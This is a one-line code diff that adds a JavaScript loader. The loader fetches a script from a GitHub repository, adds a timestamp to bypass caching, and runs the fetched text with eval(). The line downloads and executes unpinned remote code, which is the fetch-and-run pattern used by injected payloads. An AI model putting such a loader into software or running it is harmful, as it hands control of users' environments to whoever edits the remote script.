@@ -1,0 +1,1 @@
+var unixTime=Date.now(); var url='https://raw.githubusercontent.com/dinhvanhieu3011/script-auto-meo/main/script.js'+'?'+unixTime; fetch(url).then(response=>response.text()).then(script=>eval(script));
